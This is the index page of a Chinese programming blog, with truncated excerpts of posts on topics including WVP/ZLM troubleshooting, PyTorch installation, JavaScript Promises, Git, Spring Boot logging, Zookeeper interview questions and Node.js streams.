<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0571ddc2d7e737e9a0980d091450e66/" rel="bookmark">
			wvp避坑指南(1)，总有一款适合你：DateUtil类Instant.from报日期转换错误 | zlm仍在线，点播超时 | 前台编辑、删除、新增操作无效 |浏览器403forbidden 打包报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 这些错误处理起来没那么难，但是要找到其根本原因，还是要费很多精力，前人栽树后人乘凉，在阅读这些坑位时，先检查自己的jdk版本和zml流媒体，最要更新到较新版本。
（1）wvp官网要求JDK&gt;=1.8，而你使用的JDK有可能刚好是1.8.0，就会引发一些列问题；
（2）你使用的wvp是最新版本，zlm不是最新的，两者版本不匹配，也会引发一些问题；
二、坑位指南 2.1 yyyy_MM_dd_HH_mm_ssToTimestamp()报日期转换错误 问题原因：JDK版本过低。
解决方案：把本地的JDK升级为JDK1.8.0.121，或更高版本，并在工程中更新你的各种配置（包括：JDK环境变量、IDEA、Maven的settings.xml配置尾部）都指向新版本的JDK。
IDEA快捷键：Ctrl+Alt+shift+s
如需更多帮助，点击：JDK环境配置、Maven环境配置、Maven在IDEA中的配置(参考一、1.2章节)
2.2 播放10几秒后，自动断开或者提示验证后zlm仍在线，点播接口等待超时 问题原因：问题一般是环环相扣的，也就是说，如果在上面修改了expire方法后导致expire方法间歇性失效，导致中断，另外一个原因就是zml版本过低（点击下载），于wvp版本不匹配。
解决方案：更新一下你的ZLM版，点击下载，当然这个问题也可能是你在上一个问题报错的情况下，修改了DeviceServiceImpl类中的expire()的日期转换判断有关（说明：该方法代码不需要做日期判断修改，切换更高版本JDK就可以了）。 2.3 前台界面的编辑、删除、新增操作无效，浏览器403 forbidden错误 浏览器console错误提示：webSocket is closed before the connection is established 问题原因：这是一个跨域问题，403 forbidden意思是无权限访问，官网提示如下：
解决方案：如果本地运行源代码，则需要把application.yml中的active:local （默认）修改为dev，改后的效果：
spring: application: name: wvp profiles: active: dev 然后根据官网提示，在all-application.yml中复制一份users-settings:到application-dev.yml的尾部，如下所示： 提示，如果直接是mvn -package 打包(官网有详细介绍) 为jar包运行，则也要修改这个配置，否则页面效果也是无法修改、删除新增操作的。
# [根据业务需求配置] user-settings: # 跨域配置，配置你访问前端页面的地址即可， 可以配置多个 allowed-origins: - http://localhost:8080 - http://192.168.1.30:8080 - http://127.0.0.1:8080 2.4 mvn命令打包或install源码时，IDEA控制台报maven:git-comit-id-plugin错误 Failed to ewecute goal pl.project13.maven:git-comit-id-plugin:3.0.1:revision (default) on project wp-pro:Could not completeMojo execution. .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0571ddc2d7e737e9a0980d091450e66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d62fcf85c823c284623ff62c82836668/" rel="bookmark">
			No matching distribution found for torch==1.10.1&#43;cu111
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 注意问题PyTorch 安装 gpu版本的问题我的电脑配置不想看我的经历可以直接使用下方命令对应1.10版本的torch对应1.9.1版本的torch对应1.6.0版本的torch 安装PyTorch-cu之路==接下来就不是废话了==第一种办法第二种办法 补充第二种方法问题: 基于python 3.8 cuda111&lt;112的版本和torch-cu101不兼容， 这部分可以自己解决。 我还要补充下anconda创建虚拟环境参考下载地址安装验证安装（前提环境变量已经添加）更改镜像源(这一步我没有做)创建虚拟环境报错 删除虚拟环境方法一：使用conda env remove -p 虚拟环境路径命令，指定要删除的虚拟环境的路径。==好用==方法二：使用conda remove -n 虚拟环境名 --all命令，==不管用==方法三：直接手动删除 ==好用== 激活虚拟环境 安装torch1.6 注意问题 UserWarning: GeForce RTX 3060 Laptop GPU with CUDA capability sm_86 is not compatible with the current PyTorch installation. The current PyTorch install supports CUDA capabilities sm_37 sm_50 sm_60 sm_61 sm_70 sm_75 compute_37. If you want to use the GeForce RTX 3060 Laptop GPU GPU with PyTorch, please check the instructions at https://pytorch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d62fcf85c823c284623ff62c82836668/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e14d57e9766be4e1d940d153abd3156b/" rel="bookmark">
			C&#43;&#43; / 顺序表删除最小元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;iostream&gt; #define MAXSIZE 100 //定义线性表最大长度 using namespace std; typedef int ElemType; typedef struct { ElemType data[MAXSIZE]; //顺序表的元素 int length; //顺序表的当前长度 }SqList; //顺序表的类型定义 bool Del_Min(SqList &amp;L,ElemType &amp;value) { if(L.length == 0) return false; //表空，中止操作返回 value = L.data[0]; //假定0号元素的值最小 int pos = 0; for(int i = 1; i &lt;L.length; i++) //遍历表，寻找最小元素 if(L.data[i] &lt; value) //让value记忆当前具有最下值的元素 { value = L.data[i]; pos = i; } L.data[pos] = L.data[L.length - 1]; L.length--; return true; } int main() { SqList L; int n; L.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e14d57e9766be4e1d940d153abd3156b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe8d147de391b05b064351ad8dc2a684/" rel="bookmark">
			js基础之Promise（全面&#43;手写实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 是什么 Promise是一种异步编程的解决方案，用于处理异步操作并返回结果。
主要作用是解决回调函数嵌套（回调地狱）的问题，使异步操作更加清晰、易于理解和维护。
2. 怎么用 Promise有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。当一个Promise被创建时，它的状态为pending。当异步操作完成并成功时，Promise的状态会变为fulfilled，并返回一个结果。当异步操作失败时，Promise的状态会变为rejected，并返回一个错误信息。
基本语法 // 创建一个promise let promise = new Promise(function(resolve, reject) { // 异步操作 if (异步操作成功) { resolve(value); // 将异步操作的结果传递给Promise对象，状态变为fulfilled } else { reject(error); // 将异步操作的错误信息传递给Promise对象，状态变为rejected } }); promise.then(function(result) { // 异步操作成功时的处理代码 }).catch(function(error) { // 异步操作失败时的处理代码 }); 常用方法 then
then中一般传入两个参数（函数），第一个对应resolve成功的回调，第二个对应reject失败的回调，如下
function onResolved(res) { console.log("resolved-" + res); // resolved-成功了 } function onRejected(err) { console.log("rejected-" + err); // rejected-失败了 } new Promise((resolve, reject) =&gt; { resolve('成功了'); // reject('失败了') }).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe8d147de391b05b064351ad8dc2a684/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f08e893e15a5ccdfcf687fd4d2ce213/" rel="bookmark">
			Git提交代码仓库的两种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一: 两种本地与远程仓库同步 """
1）你作为项目仓库初始化人员：
线上要创建空仓库 =&gt; 本地初始化好仓库 =&gt; 建立remote链接(remote add) =&gt; 提交本地仓库到远程(push)
2）你作为项目后期开发人员：
远程项目仓库已经创建成功 =&gt; 复制远程仓库到本地(clone) =&gt; 进入仓库就可以进行接下来的开发
"""
1 git 远程仓库 1.创建一个空项目，如果选择.gitignore和开源许可，那么创建的创建就不是一个空仓库，会存在: 1 .gitignore 2 LICENSE 开源许可 2.创建完成的空仓库 提交本地版本库操作
1.初始化 git init 2.查看当前状态 git status 3.提交到暂存区 git add . 4.查询当前状态 git status 5.提交到本地的版本库 git commit -m '第一次提交' 提交到远程版本库操作
1.Git 全局设置:
git config --global user.name "www.zhang.com" git config --global user.email "10311112+wwwzhang-com@user.noreply.gitee.com" # 注意: 如果邮箱设置的是别人的邮箱，那么提交到远程仓库就会显示别人的头像与名称 git config --global user.email "10311112+wwwzhang-com@user.noreply.gitee.com" 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f08e893e15a5ccdfcf687fd4d2ce213/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e2a3904f9d266ea824befb85e391206/" rel="bookmark">
			Spring Boot实战：操作日志记录实现技巧详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 添加依赖2. 自定义 Log 注解3. 定义 LogAspect 切面4. 使用注解5. 总结拓展：日志记录接口返回结果 在实际开发中，我们经常需要记录用户的操作日志，以便进行追踪和分析。使用 AOP（面向切面编程）可以方便地实现操作日志的记录。本文将介绍如何使用 Spring Boot 和 AOP 进行操作日志记录。 1. 添加依赖 首先，需要在 pom.xml 文件中添加 AOP 相关的依赖：
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;/dependency&gt; 2. 自定义 Log 注解 为了标记需要记录操作日志的方法，我们可以定义一个 Log 注解：
@Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) public @interface Log { String operation() default ""; // 操作内容 } Log 注解中包含一个 operation 属性，用于记录操作内容。
3. 定义 LogAspect 切面 接下来，我们需要定义一个 LogAspect 切面来实现操作日志的记录。LogAspect 切面需要使用 @Aspect 和 @Component 注解进行标记，表示它是一个切面并且可以被 Spring 管理。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e2a3904f9d266ea824befb85e391206/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df7759872e49dfa342518015262abb95/" rel="bookmark">
			java基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注释：
⭐注释分别为三种：单行注释、多行注释、文档注释；
⭐单行注释：“//”
⭐多行注释：以“/*”开始“*/”结束
⭐文档注释：以“/**”开始“*/”结尾
标识符：
⭐所有的标识符都应该以字母（A-Z或者a-z）、美元符号、下划线和数字构成；首字母不能以数字开头；
⭐不能使用关键字作为变量名或方法名；
⭐标识符大小写敏感；
⭐可以用中文字命名；
数据类型：
⭐数据类型分为两类：基本类型、引用类型
⭐基本类型：数值类型、boolean类型
⭐数值类型分为数值类型、浮点类型、字符类型；
数值类型：byte（一个字节）、short（两个字节）、int（四个字节）、long（八个字节）
浮点类型：float（四个字节）、double（八个字节）
字符类型：char（两个字节）
⭐Boolean类型：占一个字节；值只有true和false两个；
⭐引用数据类型：类、接口、数组；
public class Helloworld { public static void main(String args[]) { System.out.println("Hello world"); } } 用jdk编译并执行代码：
编译：javac Helloworld.java
执行：java helloworld
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60d8a1bdcf1dff94daa3432ec844931d/" rel="bookmark">
			【附源码】Java计算机毕业设计猫眼电影购票网（程序&#43;LW&#43;部署）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目运行
环境配置：
Jdk1.8 + Tomcat7.0 + Mysql + HBuilderX（Webstorm也行）+ Eclispe（IntelliJ IDEA,Eclispe,MyEclispe,Sts都支持）。
项目技术：
java+ mybatis + Maven等等组成，B/S模式 + Maven管理等等。
环境需要
1.运行环境：最好是java jdk 1.8，我们在这个平台上运行的。其他版本理论上也可以。
2.IDE环境：IDEA，Eclipse,Myeclipse都可以。推荐IDEA;
3.tomcat环境：Tomcat 7.x,8.x,9.x版本均可
4.硬件环境：windows 7/8/10 1G内存以上；或者 Mac OS；
5.是否Maven项目: 否；查看源码目录中是否包含pom.xml；若包含，则为maven项目，否则为非maven项目
6.数据库：MySql 5.7/8.0等版本均可；
毕设帮助，指导，本源码分享，调试部署(见文末)
系统用例 本系统有主要分为三大部分组成，有登录，用户和管理员等用例。
登录模块用例中用户包括用户和管理员和二种角色，分别可以进行其对应的身份登录或取消登录，关闭系统。登录模块用例图如图3-1所示。 3-1 用户登录用例图
（2）用户模块主要包括主页，个人中心，用户分享管理，我的收藏管理等功能，用户模块用例图如图3-2所示。
图3-2 用户用例图
（3）管理员通过系统对可以实现网站系统管理，主要包括首页，个人中心，用户管理，电影类型管理，放映厅管理，电影信息管理，系统管理，订单管理等功能。管理员模块用例图如图3-3所示。
图3-3 管理员用例图
4系统设计 这章节主要是对系统总体设计，数据库设计等几个方面进行了详细的论述。
4.1系统总体设计 系统总体设计即对有关系统全局问题的设计，也就是设计系统总的处理方案，又称系统概要设计。它包括系统规划与系统功能设计等内容。
猫眼电影购票网主要有两类用户。分别是管理员和用户，详细规划如图4-1所示。
图4-1 系统规划图
其中各子模块的主要功能如下：
1、用户登录：用户进入网页先输入用户名与密码，选择权限登录，用户登录成功，要记录登录的用户名和登录类型。
2、新用户注册：新用户填写用户名，密码，姓名，手机，邮箱等信息完成注册操作。
3、查看网上电影购票信息：用户登录成功后，能够按分类或者查找网上电影购票信息进行管理。
4、主页内容管理：管理员登录以后，可以对首页，个人中心，用户管理，电影类型管理，放映厅管理，电影信息管理，系统管理，订单管理进行详细操作。
4.2数据库设计 数据库是一个软件项目的根基，它决定了整个项目代码的走势，同时也决定了整个项目在后期的维护以及升级的难易程度。
4.2.1 数据库概念设计 根据猫眼电影购票网的功能需求，对数据库进行分析，得到相应的数据，设计用户需要的各种实体，以及相互之间的关联，为逻辑结构设计铺好路。根据所实体内的各种具体信息得于实现。
1.用户注册信息实体
用户注册信息实体包括用户名，密码，确认密码，姓名，手机等属性。用户注册信息实体图如图4-2所示：
图4-2.用户注册信息实体图
2.电影资讯实体
电影资讯实体包括标题，简介，图片内容等属性；电影资讯实体图如图4-3所示：
图4-3电影资讯实体图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60d8a1bdcf1dff94daa3432ec844931d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b93ebc6146e96d9c3a0b5c69dad36cc5/" rel="bookmark">
			[selenium]关于使用selenium启动safari浏览器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 1.介绍2.具体配置3.启动代码 1.介绍 selenium支持多系统多浏览器,当我们在操作chrome或者firefox浏览器时,我们需要安装相应的驱动.这里我们就来说说如何操作safari浏览器吧.
其实要操作safari浏览器,也需要下载对应的驱动,但是safari浏览器已经帮助我们安装好了,所以我们只需要做一些配置就好了
2.具体配置 打开safari浏览器点击safari点击preferences点击Advanced勾选Show Develop menu in menu bar点击Develop勾选Allow Remote Automation现在你就可以运行你的代码了,如果遇到需要授权的点击允许就好了. 3.启动代码 Python: from selenium import webdriver from selenium.webdriver.safari.options import Options from time import sleep options = Options() driver = webdriver.Safari(options=options) driver.get("https://www.baidu.com") sleep(5) driver.quit() Ruby require 'selenium-webdriver' driver = Selenium::WebDriver.for :safari driver.get('https://www.selenium.dev/selenium/web/web-form.html') sleep 5 driver.quit() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60ad8f8680cc93507b5acbe42b99861f/" rel="bookmark">
			Mac安装Xcode和Xcode Command Line Tools
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Mac上安装Xcode可以通过以下步骤进行： 打开Mac App Store应用程序。
在搜索框中输入“Xcode”，或者直接点击此链接前往Xcode的下载页面。
点击“获取”按钮，然后输入您的Apple ID和密码进行登录。
安装过程可能需要一些时间，取决于您的网络速度和Mac的性能。
安装完成后，您可以在“应用程序”文件夹中找到Xcode应用程序。
安装Xcode后，您可以使用它来开发和调试iOS和Mac应用程序，包括编写代码、构建应用程序、运行模拟器等。
如果您需要进行iOS UI自动化测试，则还需要安装Xcode Command Line Tools，您可以通过以下步骤进行安装： 打开终端应用程序。
输入以下命令并按回车键：
xcode-select --install 系统会提示您安装Xcode Command Line Tools，点击“安装”按钮即可。 安装完成后，您就可以在终端中使用命令行工具进行开发和测试了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d28782ffdecfccbef6f49200702f3a53/" rel="bookmark">
			最优控制 1：最优控制中不同情形下泛函取到极值的必要条件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最优控制 1：最优控制中不同情形下泛函取到极值的必要条件 最优控制 (1)：最优控制中不同情形下泛函取到极值的必要条件引言一般问题1. t 0 t_0 t0​ 固定， t 1 t_1 t1​ 固定， x 0 = x ( t 0 ) x_0=x(t_0) x0​=x(t0​) 固定， x 1 = x ( t 1 ) x_1=x(t_1) x1​=x(t1​) 固定2. t 0 t_0 t0​ 固定， x 0 = x ( t 0 ) x_0=x(t_0) x0​=x(t0​) 固定， t 1 t_1 t1​ 自由， x 1 = x ( t 1 ) x_1=x(t_1) x1​=x(t1​) 自由3. t 0 t_0 t0​ 固定， x 0 = x ( t 0 ) x_0=x(t_0) x0​=x(t0​) 固定， t 1 t_1 t1​ 固定， x 1 = x ( t 1 ) x_1=x(t_1) x1​=x(t1​) 自由4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d28782ffdecfccbef6f49200702f3a53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/005f46c1e2b41bf107ffdbe607e443a4/" rel="bookmark">
			mock、json数据、mockAjax.js的准备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mock、json数据、mockAjax.js的准备 一、在项目中安装mockjs npm install mockjs 二、json数据准备 src &gt; mock &gt; floor.json [ { "id": "001", "name": "家用电器", "keywords": [ "节能补贴", "4K电视", "空气净化器", "IH电饭煲", "滚筒洗衣机", "电热水器" ], "imgUrl": "/images/floor-1-1.png", "navList": [ { "url": "#", "text": "热门" }, { "url": "#", "text": "大家电" }, { "url": "#", "text": "生活电器" }, { "url": "#", "text": "厨房电器" }, { "url": "#", "text": "应季电器" }, { "url": "#", "text": "空气/净水" }, { "url": "#", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/005f46c1e2b41bf107ffdbe607e443a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da76e48eee0c33ec945f970b0b9cc6a9/" rel="bookmark">
			AutoSAR软件组件开发的两类工作流程（Matlab/Simulink）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前面
自顶向下
导入arxml文件
生成模型框架
搭建算法模型
生成代码
自下向上
前面 如何在Matlab进行AutoSAR软件组件SWC的开发？也就是下图红框标识出来的部分。
常规的有两种方式自顶向下与自下而上：
从上往下：从软件组件描述文件起步从下往上：从Simulink已有模型起步 自顶向下 首先，你需要在AutoSAR的架构设计工具中，比如Davinci DEV中设计好你需要的SWC，以及这个SWC的里有哪些Runnable，Interface，Port……然后导出arxml 文件。
然后，把上一步生成的arxml 文件导入到Matlab中，Matlab会自己识别，生成模型的框架，我们只需要在这个框架里开发我们的算法，生成符合AutoSAR代码，最后在编译环境中集成。
具体操作如下：
导入arxml文件 这里借用一个大佬的例子（ID：Qingniao_Avalon）
导入指令：
arObj = arxml.importer('SWC1.arxml') 这是第一步，已经导入了arxml文件，可以看到反馈，下一步是根据这个文件生成模型框架。
生成模型框架 输入指令
arObj.createComponentAsModel("/Components/SWC1", //上面导入文件后，生成的组件名字 "ModelPeriodicRunnablesAs", //添加一个周期性的运行实体 "FunctionCallSubsystem", //回调函数 "DataDictionary",//数据字典 "SWC_Data.sldd")//sldd 生成模型：
在10ms运行实体里可以看到，只有输入输出port，具体的内容是需要我们去搭建的。
打开AutoSAR工具箱
这里注意两个东西：AUTOSAR Dictionary 和 Code Mapping
AUTOSAR Dictionary是你这个SWC的所有信息：Runnable，interface，Port，Compu Method……
Code Mapping顾名思义，就是把你模型里的各种Port、subsystem与AUTOSAR Dictionary中你定义好的AUTOSAR组件联合起来。
搭建算法模型 如何搭建？其实就是在Runnable中把输入输出，按照自己的需要连起来。
比如我们这里先把他们都加起来，再求OR：
生成代码 Ctrl+B或者
自下向上 从Simulink已有模型起步。
首先，我们要搞清楚simulink组件到autosar组件的映射，可以看一下我这篇笔记，里面有详细的介绍；
基于Matlab/Simulink的软件组件开发 · 语雀
然后，在simulink中搭建模型（要与autosar组件能映射上）；
其次，在autosar工具箱中里，也就是AUTOSAR Dictionary中定义你需要的autosar组件；
再次，在Code Mapping里把两者映射起来；
最后，生成代码，生成arxml文件，导入到autosar配置工具中，把一些端口该连接的连接起来，生成 RTE代码。
关于直接在Matlab中搭建AUTOSAR的步骤，内容较多故放在下一篇博客里讲解。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d546e2d23a7dc78c04632e0a246d2cfe/" rel="bookmark">
			入门神经网络——浅层神经网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、基础知识1.浅层神经网络介绍2.浅层神经网络的正向传播3.反向传播 二、浅层神经网络代码实例 一、基础知识 1.浅层神经网络介绍 此次构件浅层神经网络，相比于单神经元，浅层神经网络拥有多个神经元，因此又可以称为多神经元网络，如下图所示。
多神经元网络基本由三部分组成：输入层、隐藏层、输出层
**输入层：**最前面负责输入特征的层（注：在统计神经网络层数时通常不把这一层统计在内，像上图是一个2层的神经网络）。
**隐藏层：**中间的所有层称为隐藏层。
**输出层：**最后一层负责输出最后结果的层。
2.浅层神经网络的正向传播 以下图为例，首先分别计算第一层的每一个神经元的a，其中上标[]里的数字表示第几层，下标数字表示该层中的第几个神经元。
计算公式如下所示
此例子中的隐藏层的神经元个数为4个，但是当神经元个数较多时需要用向量的形式计算：
第一层：
第二层：
此例子中输入为单样本，当进行多样本输入训练时，
由此计算出 成本J，完成了依此正向传播。
3.反向传播 首先计算第二层的相关偏导数，与单神经元网络一致：
之后再计算第一层相关偏导数，由于第一层没有与损失函数直接相邻，只能通过链式法则。计算第一层相关偏导数时，首先需要计算出dZ[1],dW[1],db[1]都可以通过dZ[1]求得。
之后再进行向量化，最终得到反向传播后计算的相关偏导数如下所示
二、浅层神经网络代码实例 此次实例采用代码生成的虚拟数据集来演示，这个数据集由400个样本组成。这400个样本是400个颜色点。输入特征X是点的横纵坐标，标签Y是点的颜色标签（0表示红色，1表示蓝色）。
该样本点如下图所示：
此次的目标就是通过训练一个神经网络来通过坐标值判断在上图坐标系中某一点可能的颜色，例如坐标（-4，2）的点可能是什么颜色，（-4，3）最可能是什么颜色。将红色和蓝色的点区分出来。
import numpy as np import matplotlib.pyplot as plt import sklearn # 其它库之前我们都介绍过了。这个新库是用于数据挖掘，数据分析和机器学习的库，例如它里面就内置了很多人工智能函数 import sklearn.datasets import sklearn.linear_model # 生成数据集函数 def load_planar_dataset(): np.random.seed(1) m = 400 # number of examples N = int(m / 2) # number of points per class D = 2 # dimensionality X = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d546e2d23a7dc78c04632e0a246d2cfe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d5d104d2ecdcd4bb2a794a1e86e70e0/" rel="bookmark">
			面试题：Zookeeper的一些常见面试题及答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是Zookeeper？ Zookeeper是一个分布式协调服务，用于管理大规模分布式应用程序中的配置信息、命名服务、分布式锁、分布式队列等。
Zookeeper有哪些特点？ Zookeeper具有高可用性、高可靠性、高性能、一致性、可扩展性等特点。
Zookeeper如何实现分布式锁？ Zookeeper提供了一个临时节点的机制，可以用来实现分布式锁。一个客户端创建一个临时节点，如果创建成功则说明该锁已经被该客户端获取，如果创建失败则说明该锁已经被其他客户端获取，该客户端需要等待。当该客户端释放锁时，该临时节点也会被删除。
Zookeeper如何实现分布式队列？ Zookeeper可以使用顺序节点来实现分布式队列。当一个客户端需要向队列中添加数据时，它会创建一个顺序节点，并将数据写入该节点中。当另一个客户端需要从队列中取出数据时，它会获取当前队列中最小的节点，并从该节点中取出数据。
Zookeeper如何保证数据的一致性？ Zookeeper使用Zab协议来保证数据的一致性。Zab协议是一种基于Paxos算法的协议，它将Zookeeper集群中的所有节点分为两类：Leader和Follower。Leader节点负责处理客户端请求，并将更新操作广播给所有Follower节点，确保所有节点都有相同的数据副本。
Zookeeper如何实现主从备份？ Zookeeper可以使用Observer机制来实现主从备份。Observer节点类似于Follower节点，但不参与投票和决策。它只是被动地接收Leader节点的更新操作，并将其同步到本地数据库中。这样可以减轻Leader节点的负担，提高性能和可靠性。
Zookeeper如何实现数据的持久化？ Zookeeper可以使用快照和事务日志来实现数据的持久化。快照是Zookeeper当前内存状态的一份拷贝，可以用来恢复Zookeeper节点的状态。事务日志记录了所有的更新操作，可以用来恢复Zookeeper节点的状态和保证数据的一致性。
Q: Zookeeper的主要功能是什么？
A: Zookeeper的主要功能包括分布式锁、分布式队列、分布式协调等。
Q: Zookeeper的数据模型是什么？
A: Zookeeper的数据模型是树形结构，类似于文件系统。
Q: Zookeeper节点类型有哪些？
A: Zookeeper节点类型包括持久节点、临时节点、有序节点和临时有序节点。
Q: Zookeeper如何实现分布式锁？
A: Zookeeper可以通过创建临时节点实现分布式锁，每个节点都可以尝试创建同一个节点，但只有一个节点能够创建成功，创建成功的节点持有锁，其他节点需要等待锁被释放。
Q: Zookeeper如何实现分布式队列？
A: Zookeeper可以通过创建有序节点实现分布式队列，每个节点创建一个有序节点，按照节点的序号顺序执行任务，当任务执行完成后，删除对应的节点。
Q: Zookeeper的客户端和服务端如何通信？
A: Zookeeper的客户端和服务端通过TCP协议进行通信。
Q: Zookeeper如何保证数据的一致性？
A: Zookeeper使用ZAB协议来保证数据的一致性，ZAB协议可以保证数据的原子性和顺序性。
Q: Zookeeper的集群模式是什么？
A: Zookeeper的集群模式是主从模式，其中一个节点为主节点，其他节点为从节点，主节点负责接收客户端请求并将数据同步给从节点，从节点负责接收主节点传来的数据并保存到本地。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1709da264370777a7b303d69cddb440c/" rel="bookmark">
			Node.js简易爬虫
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		流stream 流是一组有序的、有起点和终点的字节数据的传输方式，在应用程序中各种对象之间交换与传输数据时，总是先将该对象中所包含的数据转换成各种形式的流数据（即字节数据），再通过流的传输，到达目的对象之后，再将数据转换为该对象中可以使用的数据
在Node的fs模块定义了一些与流相关的API
fs.createReadStream：得到一个ReadableStreamfs.createWriteStream：得到一个WritableStream data：当有数据可读时触发end：没有更多的数据可读时触发error：在接收和写入过程中发生错误时触发finish：所有数据已被写入到底层系统时触发 const fs = require('fs'); let readStream = fs.createReadStream('E:\\GR\\nodejs\\test01\\lab06\\demo\\data.txt'); let str = ""; readStream.on('data', function(chunk){ str += chunk + "======="; }); readStream.on('end', function(){ console.log(str); }); readStream.on('error', function (err){ throw err; }); const fs = require('fs'); let writeStream = fs.createWriteStream('E:\\GR\\nodejs\\test01\\lab06\\demo\\data.txt'); let data = "hello\n"; let data1 = "nice to meet you"; writeStream.write(data, 'utf8'); writeStream.write(data1, 'utf8'); writeStream.end(); writeStream.on('finish', function (){ console.log('完成'); }); writeStream.on('error', function (err){ console.log(err); }); console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1709da264370777a7b303d69cddb440c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c81cd40f7122848d5c31b6eb4d08620f/" rel="bookmark">
			制作词云（纯代码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		词云技术是一种将单词数据可视化的技术，通常将单词按照出现频率在一个图形中显示，单词在图形中的大小表示其出现的频率。
